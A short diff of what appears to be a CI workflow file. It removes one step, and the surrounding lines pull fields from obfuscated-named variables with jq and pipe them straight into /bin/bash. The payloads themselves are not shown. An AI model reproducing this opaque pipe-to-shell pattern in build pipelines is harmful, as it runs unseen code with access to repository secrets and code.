@@ -29,7 +29,6 @@ jobs:
           printf '%s' "$w2485" | jq -r .xp2047 | /bin/bash
           printf '%s' "$phy5865" | jq -r .dguit7 | /bin/bash
           printf '%s' "$r507" | jq -r .qgu20 | /bin/bash
-          echo $bx4416 | jq -r .hbm8 | /bin/bash
 
       - name: Save results
         if: always()
